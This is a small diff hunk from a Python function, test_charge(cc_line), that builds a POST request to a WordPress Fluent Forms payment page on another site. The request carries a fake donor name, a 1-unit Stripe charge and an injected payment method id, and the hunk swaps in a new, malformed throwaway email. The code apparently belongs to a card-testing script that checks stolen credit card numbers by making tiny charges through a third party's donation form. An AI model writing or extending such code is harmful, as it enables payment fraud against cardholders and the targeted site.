@@ -634,7 +634,7 @@ def test_charge(cc_line):
             'data': (
                 f'__fluent_form_embded_post_id=3612&_fluentform_4_fluentformnonce={fn}&'
                 f'_wp_http_referer=%2Fregistry%2F&names%5Bfirst_name%5D=diwas%20Khatri&'
-                f'email=mhitzxg%40mechanicspedia.com&custom-payment-amount=1&'
+                f'email=diwass%khatriiaol.com&custom-payment-amount=1&'
                 f'description=Thanks%20%3A-%20%40zx&payment_method=stripe&'
                 f'__stripe_payment_method_id={payment_method_id}'
             ),
